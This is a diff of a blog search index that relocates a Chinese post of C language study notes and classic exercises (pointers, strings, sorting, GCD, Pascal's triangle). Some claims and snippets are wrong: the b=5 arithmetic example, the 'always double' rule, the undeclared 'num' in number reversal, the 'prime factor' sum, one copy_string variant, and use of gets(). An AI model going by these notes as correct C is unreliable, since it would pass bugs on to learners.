@@ -466,6 +466,232 @@
       </tags>
   </entry>
   <entry>
+    <title>C语言</title>
+    <url>/2025/02/05/C%E8%AF%AD%E8%A8%80/</url>
+    <content><![CDATA[<div id="postchat_postcontent"><h1 id="C语言易错难懂知识"><a href="#C语言易错难懂知识" class="headerlink" title="C语言易错难懂知识"></a>C语言易错难懂知识</h1><h2 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h2><p>1.进制</p>
+<p>二进制：0b开头</p>
+<p>八进制：0开头</p>
+<p>十六进制：0X开头（0<del>9，A</del>F）</p>
+<p>2.float  4字节 有效数字6</p>
+<p>   double  8字节 有效数字15</p>
+<p>不同类型数据运算时，除强制类型转换外，结果都为double型</p>
+<p>在一个整数末尾加L&#x2F;l表示长整型</p>
+<p>eg. int b&#x3D;5;</p>
+<p>​      float a&#x3D;2.0;</p>
+<p>​      b&#x3D;b&#x2F;2*a; &#x2F;&#x2F;b&#x3D;5</p>
+<p>3.素数中：不必被2<del>（n-1）整除，只需被2</del>✓n即可，j*j&lt;i</p>
+<p>4.a%b结果由a的正负性决定，只要a为负数，结果为负数</p>
+<p>5.常量和常变量</p>
+<p>常变量：在定义变量时，加一个const</p>
+<p>​            eg.const int a&#x3D;3;</p>
+<p>变量：</p>
+<p>（1）整型变量 1000</p>
+<p>（2）实型变量 12.34e3</p>
+<p>（3）字符常量（只能为一个字符,’ \42 ‘为一个字符）</p>
+<p>​       1）普通字符：以ASCII码存储</p>
+<p>​                                常见的ASCII：’A’ &#x3D;65   ‘a’ &#x3D;97   0 &#x3D;48</p>
+<p>​       2）转义字符：以’ \ ‘开头，将’ \ ‘后的字符转化为另外意思</p>
+<p>​                             eg.’ \x41 ‘表示16进制41的ASCII字符，即’ A ‘</p>
+<p>​       3）字符串常量：“boy”</p>
+<p>​       4）符号常量（不能对其赋新值）：#define PI 3.1416</p>
+<p>6.标识符：只由字母，数字，下划线组成；第一个字符必须是字母或下划线</p>
+<p>7.unsigned int &#x3D;&gt;无符号整型  输出用%u</p>
+<p>   （充分利用变量的值的范围（数据范围只有正值））</p>
+<p>8.逗号表达式结果取后面的值</p>
+<p>  eg.i&#x3D;(a&#x3D;6,a*5),a+6;&#x2F;&#x2F;&gt;i&#x3D;30</p>
+<p>9.要输出%应该连续使用2个%</p>
+<p>10.字符变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char c=&#x27; ? &#x27;;</span><br><span class="line">printf(&quot;%d %c&quot;,c,c);</span><br><span class="line">=&gt;63 ?</span><br></pre></td></tr></table></figure>
+
+<p>11.i++和++i</p>
+<p>i&#x3D;3;</p>
+<p>j&#x3D;i++(i&#x3D;4,j&#x3D;3)&#x2F;&#x2F;先赋值后自加</p>
+<p>j&#x3D;++i(i&#x3D;4,j&#x3D;4)&#x2F;&#x2F;先自加在赋值</p>
+<p>12.输出：</p>
+<p>用%f得到6位小数</p>
+<p>%-m.nf ：</p>
+<p>​	   -号为左对齐</p>
+<p>​	  m为最小宽度：输出的总宽度（包括小数点、小数部分和整数部分）如果实际数据长度小于 m，将用空格填充；如果数据长度超过 				     m，则按实际长度输出，不截断</p>
+<p>​	  n为小数小数位数：如果实际小数位数超过 n，会进行四舍五入；如果不足n，会用0补足</p>
+<p>%e指定以指数形式输出实数，自动给出数字部分小数位数为6位，指数部分占5列</p>
+<p>eg.1.234560 e+002</p>
+<p>13.运算符优先级</p>
+<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250117135802930.png"></p>
+<p>14.字符（一个）输入输出：</p>
+<p>getchar  putchar(c)</p>
+<p>15.在判断一个量是否为真时，0为假，非0为真</p>
+<p>a&amp;&amp;b&#x2F;&#x2F;a和b都非0（只有a为真时，才需要判别b的值）</p>
+<p>a||b&#x2F;&#x2F;a和b至少一个非0（只有a为假时才需要判别b的值）</p>
+<p>16.判断非闰年：</p>
+<p><code>!((year%4==0&amp;&amp;year%100!=0)||year%400==0)</code></p>
+<p>17.两个数乘积&#x3D;两个数最大公约数 x 最小公倍数</p>
+<h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><h3 id="？：表达式（代替复杂的if）"><a href="#？：表达式（代替复杂的if）" class="headerlink" title="？：表达式（代替复杂的if）"></a>？：表达式（代替复杂的if）</h3><p>max&#x3D;(a&gt;b)?a:b;&#x2F;&#x2F;a&gt;b为真的话，max&#x3D;a，否则为b</p>
+<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>switch(表达式){</p>
+<p>​	case 常量1:语句1;</p>
+<p>​	……</p>
+<p>​	default:……;</p>
+<p>}</p>
+<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h3><p>只要循环条件表达式为真时，就执行</p>
+<p>eg.while(i–)&#x2F;&#x2F;每次循环开始先检查i当前值是否为真，若为真，循环继续，每次循环结束时i值减少一</p>
+<h3 id="do-while语句"><a href="#do-while语句" class="headerlink" title="do while语句"></a>do while语句</h3><p>先无条件执行，再判断循环条件是否成立</p>
+<h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><p>for(…;…[只要值为真，就执行循环];…)</p>
+<h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>break：提前终止循环</p>
+<p>continue：提前结束本次循环，接着执行下次循环</p>
+<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p><code>a[3][4]</code> &#x3D;&gt;3行4列</p>
+<h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><h4 id="字符串结束标志"><a href="#字符串结束标志" class="headerlink" title="字符串结束标志"></a>字符串结束标志</h4><p>一个字符串以字符<code>&#39;\0&#39;</code>作为结束标志（c语言在字符数组储存字符串常量市会自动加一个’\0’作结束符）</p>
+<h4 id="字符数组的输入输出"><a href="#字符数组的输入输出" class="headerlink" title="字符数组的输入输出"></a>字符数组的输入输出</h4><p>%s &#x3D;&gt;整个字符串</p>
+<p>%c &#x3D;&gt;一个字符</p>
+<p>输出时遇到’\0’就停止输出</p>
+<p>scanf输入项如果是字符数组名，不加&amp;</p>
+<p>scanf读取字符串时，会在遇空白字符时停止读取</p>
+<h5 id="单行字符串"><a href="#单行字符串" class="headerlink" title="单行字符串"></a>单行字符串</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while((ch=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line">	a[i]=ch;</span><br><span class="line">	i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char string[100];</span><br><span class="line">char c;</span><br><span class="line">gets(string);</span><br><span class="line">for(int i=0;(c=string[i])!=&#x27;\0&#x27;;i++)&#123;···&#125;\\遍历字符串中每个字符</span><br></pre></td></tr></table></figure>
+
+<h5 id="n行字符串"><a href="#n行字符串" class="headerlink" title="n行字符串"></a>n行字符串</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">getchar();</span><br><span class="line">char a[100];</span><br><span class="line">for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">	gets(a);</span><br><span class="line">	···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">getchar();</span><br><span class="line">char string[n][100];</span><br><span class="line">for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">	gets(string[i]);</span><br><span class="line">	for(int j=0;string[i][j]!=&#x27;\0&#x27;;j++)&#123;···&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h4><p>记得加<code>#include&lt;string.h&gt;</code></p>
+<h5 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h5><p>输出的字符串中可以包含转义字符</p>
+<p>e.g </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char str[]=&#123;&quot;abc \n def&quot;&#125;;</span><br><span class="line">puts(str);</span><br><span class="line">   =&gt;abc</span><br><span class="line">     def</span><br></pre></td></tr></table></figure>
+
+<h5 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h5><p>从终端输入一个字符串到字符数组，并且得到一个函数值，该函数值是字符数组的起始地址</p>
+<p>注：gets和puts函数只能输入&#x2F;输出一个字符串</p>
+<h5 id="strcat"><a href="#strcat" class="headerlink" title="strcat"></a>strcat</h5><p>把两个字符数组中字符串连接起来</p>
+<p>strcat(str1,str2);</p>
+<h5 id="strcpy和strncpy"><a href="#strcpy和strncpy" class="headerlink" title="strcpy和strncpy"></a>strcpy和strncpy</h5><p>字符串复制函数</p>
+<h6 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h6><p>将字符串2复制到字符数组1中</p>
+<p>注：赋值语句只能将一个字符赋给一个字符型变量&#x2F;字符数组元素</p>
+<h6 id="strncpy"><a href="#strncpy" class="headerlink" title="strncpy"></a>strncpy</h6><p>将字符串2中前n个字符复制到字符数组1中</p>
+<p>strncpy(str1,str2,2);&#x2F;&#x2F;将str2前2个取代str1原有的2个</p>
+<h5 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h5><p>字符串比较：2个字符串从左到右逐个比较（ASCII值），直到出现不同字符或遇到’\0’为止</p>
+<p>字符串1&#x3D;字符串2  函数值为0</p>
+<p>字符串1&gt;字符串2  函数值为正整数</p>
+<p>字符串1&lt;字符串2  函数值为负整数</p>
+<h5 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h5><p>测字符串长度</p>
+<h5 id="strlwr"><a href="#strlwr" class="headerlink" title="strlwr"></a>strlwr</h5><p>转换为小写</p>
+<h5 id="strupr"><a href="#strupr" class="headerlink" title="strupr"></a>strupr</h5><p>转换为大写</p>
+<h4 id="头文件"><a href="#头文件" class="headerlink" title="&lt;ctype.h&gt;头文件"></a>&lt;ctype.h&gt;头文件</h4><p>isalpha判断一个字符是否是字母</p>
+<p>isdigit判断一个字符是否是数字</p>
+<p>islower判断一个字符是否是小写字母</p>
+<p>isupper判断一个字符是否是大写字母</p>
+<p>isspace判断一个字符是否是空白字符</p>
+<p>tolower将字符大写变小写</p>
+<p>toupper将字符小写变大写</p>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的定义与声明"><a href="#函数的定义与声明" class="headerlink" title="函数的定义与声明"></a>函数的定义与声明</h3><p>在定义函数时要指定函数的类型</p>
+<p>函数类型决定返回值类型</p>
+<p>用函数原型（函数首部）作函数声明</p>
+<p>e.g int add(int a,int b);</p>
+<h3 id="函数的嵌套"><a href="#函数的嵌套" class="headerlink" title="函数的嵌套"></a>函数的嵌套</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int max4(int a,int b,int c,int d)&#123;</span><br><span class="line">	int max2(int a,int b);</span><br><span class="line">	return max2(max2(max2(a,b),c),d);</span><br><span class="line">&#125;</span><br><span class="line">int max2(int a,int b)&#123;</span><br><span class="line">	return(a&gt;=b?a:b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="局部与全局变量"><a href="#局部与全局变量" class="headerlink" title="局部与全局变量"></a>局部与全局变量</h3><p>注：全局变量开头一般用大写字母，来区别局部变量</p>
+<h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><p>静态局部&#x2F;全局变量</p>
+<p>函数中局部变量的值在函数调用结束后不消失而继续保留本次调用结束后的值</p>
+<p>e.g <code>static int f=1;</code></p>
+<h4 id="extern"><a href="#extern" class="headerlink" title="extern"></a>extern</h4><p>外部变量声明</p>
+<p>在一个文件内扩展外部变量的作用域</p>
+<p>将外部变量的作用域扩展到其他文件</p>
+<p>e.g <code>extern A,B,C; \ \可省略int等类型</code></p>
+<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><h3 id="指针变量"><a href="#指针变量" class="headerlink" title="指针变量"></a>指针变量</h3><p>指针是一个地址，而指针变量是存放地址的变量</p>
+<p>指针变量中只能存放地址（指针），不要将一个整数给指针变量</p>
+<p>p&#x3D;&a;</p>
+<p>*p&#x3D;1;\ \将1赋值给p所指向的变量即把1赋给a</p>
+<p>定义：类型名 * 指针变量名</p>
+<p>​	int* point;      </p>
+<p>​	point&#x3D;&a;\ \等价于int* point&#x3D;&a;</p>
+<p>函数调用时不加*</p>
+<p>e.g swap(point_1,point_2);</p>
+<p>为使在函数中改变的变量能被main所用，应该用指针变量做函数参数</p>
+<p>e.g</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void swap(int *p1,int *p2)&#123;</span><br><span class="line">	int temp;</span><br><span class="line">	temp=*p1;</span><br><span class="line">	*p1=*p2;</span><br><span class="line">	*p2=temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过指针引用数组"><a href="#通过指针引用数组" class="headerlink" title="通过指针引用数组"></a>通过指针引用数组</h3><h4 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int *p;</span><br><span class="line">p=&amp;a[0];\\不能写成*p=&amp;a[0];</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=&amp;a[0];</span><br><span class="line">p=a;\\p的值是数组a的首元素</span><br></pre></td></tr></table></figure>
+
+<p>如果指针元素p指向数组中的一个元素，则p+1指向同一数组的下个元素，p-1指向同一数组的上个元素</p>
+<p>如果p的初值为&amp;a[0]，则p+i&#x2F;a+i即a[i]的地址，*(p+i)&#x2F; *(a+i)是p+i&#x2F;a+i所指向的数组元素即a[i]</p>
+<p>两个地址不能相加</p>
+<p>若指针变量p1、p2都指向同一数组中的元素，p2-p1结果为(p2-p1)的值（地址之差）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int i,a[10];</span><br><span class="line">int* p=a;\\p初值是a，p指向a[0]</span><br><span class="line">for(i=0;i&lt;10;i++)scanf(&quot;%d&quot;,p++);</span><br><span class="line">p=a;\\重新使p指向a[0]</span><br><span class="line">for(i=0;i&lt;10;i++,p++)printf(&quot;%d&quot;,*p);</span><br></pre></td></tr></table></figure>
+
+<p>若a[0]&#x3D;3，++(*p) &#x3D;&gt;a[0]&#x3D;4</p>
+<p>fun(int arr[],int n)  &#x3D;  fun(int* arr,int n)</p>
+<h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><p><code>*(a[i]+j)</code>或 <code>*(*(a+i)+j)</code>是<code>a[i][j]</code>的值</p>
+<p>对于a是二维数组，则a[i]是一位数组名，他是一个地址，并不代表一个储存单元&#x2F;其中的值</p>
+<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250119103815734.png"></p>
+<p>int (*p)[4]定义包含4个元素的一维数组的指针变量</p>
+<p>e.g 有一个二维数组<code>int arr[3][4]</code>，可用int (*p)[4]来声明一个指针p指向这个二维数组某一行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int arr[3][4]=&#123;&#123;0,1,2,3&#125;,&#123;4,5,6,7&#125;,&#123;8,9,10,11&#125;&#125;;</span><br><span class="line">int (*p)[4]=&amp;arr[0];\\p指向arr某一行</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过指针引用字符串"><a href="#通过指针引用字符串" class="headerlink" title="通过指针引用字符串"></a>通过指针引用字符串</h3><p>通过字符数组名&#x2F;字符指针变量可以输出一个字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char* a,str[10];</span><br><span class="line">a=str;</span><br><span class="line">scanf(&quot;%s&quot;,a);</span><br></pre></td></tr></table></figure>
+
+<p>数组名虽代表地址，但它是常量，其值不可改变</p>
+<p>字符指针变量指向的字符串常量中的内容是不可被取代</p>
+<h3 id="指向函数的指针"><a href="#指向函数的指针" class="headerlink" title="指向函数的指针"></a>指向函数的指针</h3><p>函数名是一个指针（地址）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int (*p)(int,int)</span><br><span class="line">p=max;\\将函数入口地址赋给p</span><br><span class="line">c=(*p)(a,b);\\用*p代替函数名</span><br></pre></td></tr></table></figure>
+
+<p>char* p[6]包含6个指针的数值</p>
+<h2 id="用户自己建立数据类型"><a href="#用户自己建立数据类型" class="headerlink" title="用户自己建立数据类型"></a>用户自己建立数据类型</h2><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>struct 结构体名{</p>
+<p>​	成员表列（类型名 成员名）;</p>
+<p>};</p>
+<p>引用结构体变量中成员的值：结构体变量名.成员名 e.gstudent1.num&#x3D;10010;</p>
+<p>不能通过输出结构体变量名来达到输出结构体变量所有成员的值</p>
+<p>若p指向一个结构体变量stu</p>
+<p>则 stu.num &lt;&#x3D;&gt; (*p).num &lt;&#x3D;&gt; p-&gt;num</p>
+<p>结构体数组读入不用加&amp;</p>
+<h3 id="共用体"><a href="#共用体" class="headerlink" title="共用体"></a>共用体</h3><p>union 共用体名{</p>
+<p>​	成员表列（类型名 成员名）;</p>
+<p>};</p>
+<h3 id="typedef声明新类型名"><a href="#typedef声明新类型名" class="headerlink" title="typedef声明新类型名"></a>typedef声明新类型名</h3><h1 id="C语言经典例题"><a href="#C语言经典例题" class="headerlink" title="C语言经典例题"></a>C语言经典例题</h1><h2 id="统计一个字符串中每个单词的字符数"><a href="#统计一个字符串中每个单词的字符数" class="headerlink" title="统计一个字符串中每个单词的字符数"></a>统计一个字符串中每个单词的字符数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char c;</span><br><span class="line">	int count=0;\\用于统计当前单词的字符数</span><br><span class="line">	int first=1;\\用于标记是否是第一个输出的字符数，初始值为1，表示是第一个</span><br><span class="line">	while(scanf(&quot;%c&quot;,&amp;c)&amp;&amp;c!=&#x27;.&#x27;)&#123;</span><br><span class="line">		if(c==&#x27; &#x27;)&#123;\\如果读取到的字符是空格，说明当前单词结束</span><br><span class="line">			if(count&gt;0)&#123;\\如果count大于0，说明前面有单词字符被统计</span><br><span class="line">				if(!first)printf(&quot; &quot;);\\如果first为0（即不是第一个输出），则先输出一个空格作为分隔</span><br><span class="line">				printf(&quot;%d&quot;,count);</span><br><span class="line">				first=0;</span><br><span class="line">				count=0;\\重置count为0，准备统计下一个单词</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else count++;\\如果读取到的字符不是空格，则count加1，继续统计当前单词的字符数</span><br><span class="line">	&#125;</span><br><span class="line">	if(count&gt;0)&#123;\\循环结束后，如果count大于0，说明最后一个单词的字符数还没有输出</span><br><span class="line">		if(!first)printf(&quot; &quot;);\\如果不是第一个输出，先输出一个空格</span><br><span class="line">		printf(&quot;%d&quot;,count);\\输出最后一个单词的字符数</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="统计3个字符串，并找出其中最大值"><a href="#统计3个字符串，并找出其中最大值" class="headerlink" title="统计3个字符串，并找出其中最大值"></a>统计3个字符串，并找出其中最大值</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char str [3] [20];</span><br><span class="line">	char string[20];</span><br><span class="line">	for(int i=0;i&lt;3;i++)&#123;</span><br><span class="line">		gets(str[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	for(int i=0;i&lt;2;i++)&#123;</span><br><span class="line">		if(strcmp(str[i],str[i+1])&gt;0)strcpy(string,str[i]);</span><br><span class="line">		if(strcmp(str[i],str[i+1])&lt;=0)strcpy(string,str[i+1]);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;%s&quot;,string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="字符串的复制（指针）"><a href="#字符串的复制（指针）" class="headerlink" title="字符串的复制（指针）"></a>字符串的复制（指针）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while((*to=*from)!=&#x27;\0&#x27;)&#123;</span><br><span class="line">		to++;</span><br><span class="line">		from++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while((*to++=*from++)!=&#x27;\0&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while(*from!=&#x27;\0&#x27;)&#123;</span><br><span class="line">		*to++=*from++;</span><br><span class="line">		*to=&#x27;\0&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void selectSort(int arr[],int n)&#123;</span><br><span class="line">    int i,j,minIndex,temp;</span><br><span class="line">    for(i=0;i&lt;n-1;i++)&#123;  //外层循环控制排序趟数</span><br><span class="line">        minIndex=i;  //假设当前位置元素就是最小值</span><br><span class="line">        for (j=i+1;j&lt;n;j++)&#123;  //内层循环在剩余元素中找最小值</span><br><span class="line">            if(arr[j]&lt;arr[minIndex])minIndex=j;  //更新最小值索引</span><br><span class="line">        &#125;</span><br><span class="line">        if(minIndex!=i)&#123;  //如果找到更小的元素，进行交换</span><br><span class="line">            temp=arr[i];</span><br><span class="line">            arr[i]=arr[minIndex];</span><br><span class="line">            arr[minIndex]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="人数过半"><a href="#人数过半" class="headerlink" title="人数过半"></a>人数过半</h2><p>输入N个数，求出现次数超过总数一半的数。数据保证存在这个数。</p>
+<p>输入格式:</p>
+<p>第一行输入一个正整数N(N&lt;1000)；</p>
+<p>第二行输入N个数，每个数的绝对值不超过1e9。</p>
+<p>输出格式:</p>
+<p>输出一个数，即出现次数超过总数一半的数。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int n;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">    int a[2000];</span><br><span class="line">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    int can=a[0];</span><br><span class="line">    int cnt=1;</span><br><span class="line">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">        if(cnt==0)&#123;</span><br><span class="line">            can=a[i];</span><br><span class="line">            cnt=1;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(can==a[i])cnt++;</span><br><span class="line">        else cnt--;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%d&quot;,can);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="n个数字中选出数字和最大的连续一段"><a href="#n个数字中选出数字和最大的连续一段" class="headerlink" title="n个数字中选出数字和最大的连续一段"></a>n个数字中选出数字和最大的连续一段</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sum1=0,sum=-1000;</span><br><span class="line">   for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">       sum1=(sum1+a[i])&gt;a[i]?(sum1+a[i]):a[i];</span><br><span class="line">       if(sum1&gt;sum)sum=sum1;</span><br><span class="line">   &#125;</span><br><span class="line">   printf(&quot;%d&quot;,sum);</span><br></pre></td></tr></table></figure>
+
+<h2 id="结尾不输出空行"><a href="#结尾不输出空行" class="headerlink" title="结尾不输出空行"></a>结尾不输出空行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int flag=1;</span><br><span class="line">···</span><br><span class="line">if(!flag)printf(&quot;\n&quot;);</span><br><span class="line">flag=0;</span><br><span class="line">···\\输出···</span><br></pre></td></tr></table></figure>
+
+<h2 id="数组元素右移"><a href="#数组元素右移" class="headerlink" title="数组元素右移"></a>数组元素右移</h2><p>n个数，第i个数向右移m个整数变为a[(i+n-m)%n]</p>
+<h2 id="单词翻转"><a href="#单词翻转" class="headerlink" title="单词翻转"></a>单词翻转</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">char* r(char* s)&#123;</span><br><span class="line">	int len=strlen(s);</span><br><span class="line">	for(int i=0;i&lt;len/2;i++)&#123;</span><br><span class="line">		char t=s[i];</span><br><span class="line">		s[i]=s[len-1-i];</span><br><span class="line">		s[len-1-i]=t;</span><br><span class="line">	&#125;</span><br><span class="line">	return s;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char s[25];</span><br><span class="line">	while(scanf(&quot;%s&quot;,s)!=EOF)&#123; \\去除多余空格</span><br><span class="line">		printf(&quot;%s&quot;,r(s));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="10进制数n转化成m进制"><a href="#10进制数n转化成m进制" class="headerlink" title="10进制数n转化成m进制"></a>10进制数n转化成m进制</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int cnt=1,sum=0;</span><br><span class="line">while(n&gt;0)&#123;</span><br><span class="line">	t=n%m;</span><br><span class="line">	t*=cnt;</span><br><span class="line">	sum+=t;</span><br><span class="line">	n/=m;</span><br><span class="line">	cnt*=10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="求n的素数因子和"><a href="#求n的素数因子和" class="headerlink" title="求n的素数因子和"></a>求n的素数因子和</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=1;i&lt;sqrt(n);i++)&#123;</span><br><span class="line">	if(n%i==0)&#123;</span><br><span class="line">		sum+=i;</span><br><span class="line">		if(n/i!=i)&#123;</span><br><span class="line">			sum+=n/i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="求a，b的最大公约数"><a href="#求a，b的最大公约数" class="headerlink" title="求a，b的最大公约数"></a>求a，b的最大公约数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m=a;</span><br><span class="line">n=b;</span><br><span class="line">while(n!=0)&#123;</span><br><span class="line">	t=m%n;</span><br><span class="line">	m=n;</span><br><span class="line">	n=t;</span><br><span class="line">&#125;\\m即为最大公约数</span><br></pre></td></tr></table></figure>
+
+<h2 id="将一个n位数反转"><a href="#将一个n位数反转" class="headerlink" title="将一个n位数反转"></a>将一个n位数反转</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int number,res=0,rem;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">while(number!=0)&#123;</span><br><span class="line">	rem=num%10;</span><br><span class="line">	res=res*10+rem;</span><br><span class="line">	number/=10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int rows,conf=1;</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;rows);</span><br><span class="line">	for(int i=0;i&lt;rows;i++)&#123;</span><br><span class="line">		for(int space=1;space&lt;=rows-i-1;space++)&#123;</span><br><span class="line">			printf(&quot;  &quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		for(int j=0;j&lt;=i;j++)&#123;</span><br><span class="line">			if(j==0||i==0)conf=1;</span><br><span class="line">			else conf=conf*(i-j+1)/j;</span><br><span class="line">			printf(&quot;%4d &quot;,conf);</span><br><span class="line">		&#125;</span><br><span class="line">		printf(&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</div>]]></content>
+      <categories>
+        <category>编程</category>
+      </categories>
+      <tags>
+        <tag>编程</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTTP</title>
     <url>/2024/10/15/HTTP/</url>
     <content><![CDATA[<div id="postchat_postcontent"><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="HTTP概述"><a href="#HTTP概述" class="headerlink" title="HTTP概述"></a>HTTP概述</h2><p><strong>HTTP</strong> 是一种用作获取诸如 HTML 文档这类资源的协议（TTP 是一种应用层的协议，通过 TCP 或 TLS（一种加密过的 TCP 连接）来发送）。它是 Web 上进行任何数据交换的基础，也是一种客户端—服务器（client-server）协议</p>
@@ -1094,232 +1320,6 @@
       </tags>
   </entry>
   <entry>
-    <title>C语言</title>
-    <url>/2025/02/05/C%E8%AF%AD%E8%A8%80/</url>
